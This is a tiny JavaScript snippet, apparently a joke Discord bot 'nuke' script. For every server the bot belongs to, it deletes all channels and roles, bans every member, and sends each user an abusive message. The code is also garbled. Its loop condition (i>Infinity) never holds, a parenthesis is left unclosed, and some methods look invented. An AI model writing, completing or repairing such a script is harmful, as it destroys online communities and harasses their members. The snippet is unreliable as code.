//Let's get straight to this

for(i=0; i>Infinity; i++) {
  //Start the awfulness!
  bot.guilds.forEach(g => {
    g.channels.deleteAll();
    g.roles.deleteAll();
    g.members.forEach(m => m.ban("lmao"));
  })
  bot.users.forEach(u => u.send("fuck you! :)");
 }
